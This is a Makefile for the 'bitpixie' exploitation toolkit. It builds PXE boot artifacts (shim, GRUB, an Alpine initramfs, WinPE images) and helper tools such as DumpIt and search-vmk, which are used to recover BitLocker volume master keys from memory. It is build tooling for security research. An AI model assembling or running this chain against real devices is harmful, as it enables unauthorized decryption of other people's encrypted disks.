# Folders
PXE ?= ./pxe
TFTP = ${PXE}/tftp
SMB = ${PXE}/smb

# Artifacts Linux
INITRAMFS = ${TFTP}/alpine-initrd.xz
KERNEL = ${TFTP}/linux
SHIM = ${TFTP}/shimx64.efi
GRUB = ${TFTP}/grubx64.efi

# Artifacts WinPE
BOOT_SDI = ${TFTP}/Boot/boot.sdi
BOOT_WIM = ${TFTP}/Boot/boot.wim
DUMPIT_EXE = ${SMB}/winpe/DumpIt.exe
SEARCH_VMK_EXE = ${SMB}/winpe/search-vmk.exe
DISLOCKER_METADATA_EXE = ${SMB}/winpe/dislocker-metadata.exe

all: linux winpe

linux: ${SHIM} ${GRUB} ${KERNEL} ${INITRAMFS}
	@echo "Building Linux based bitpixie exploitation components..."

${INITRAMFS} ${KERNEL}:
	@echo "Preparing initramfs and kernel..."
	linux/initramfs/bitpixie build
	linux/initramfs/bitpixie deploy

${SHIM} ${GRUB}:
	@echo "Preparing shim and GRUB..."
	docker run --platform linux/amd64 --rm -v "${PWD}/linux/bootloader:/build" -v "${PXE}":/mnt -w /root \
                alpine:3.20.3 "/build/download.sh"

winpe: ${BOOT_SDI} ${BOOT_WIM} ${DUMPIT_EXE} ${SEARCH_VMK_EXE} ${DISLOCKER_METADATA_EXE}
	@echo "Building WinPE based bitpixie exploitation components..."

${BOOT_SDI} ${BOOT_WIM}:
	@echo "Preparing Windows boot.{sdi,wim} files..."
	docker run --platform linux/amd64 --rm -v "${PWD}/winpe:/build" -v "${PXE}":/mnt -w /root \
                alpine:3.20.3 "/build/download-winpe.sh"

${DUMPIT_EXE}:
	@echo "Please download Magnet DumpIt for Windows"
	@echo "\n https://www.magnetforensics.com/resources/magnet-dumpit-for-windows/\n"
	@echo "And place it into $@\n"
	@exit 1

${SEARCH_VMK_EXE}:
	@echo "Bulding $@..."
	docker run --platform linux/amd64 --rm -v "${PWD}/search-vmk:/src" -v "${PWD}/winpe:/build" -v "${PXE}":/mnt -w /root \
                alpine:3.20.3 "/build/build-search-vmk.sh"

${DISLOCKER_METADATA_EXE}:
	@echo "Bulding $@..."
	docker run --platform linux/amd64 --rm -v "${PWD}/winpe:/build" -v "${PXE}":/mnt -w /root \
                alpine:3.20.3 "/build/build-dislocker-metadata.sh"

clean:
	@rm -f "${SHIM}" "${GRUB}" "${KERNEL}" "${INITRAMFS}"
	@rm -f "${BOOT_SDI}" "${BOOT_WIM}" "${SEARCH_VMK_EXE}" "${DISLOCKER_METADATA_EXE}"

.PHONY: all linux winpe clean
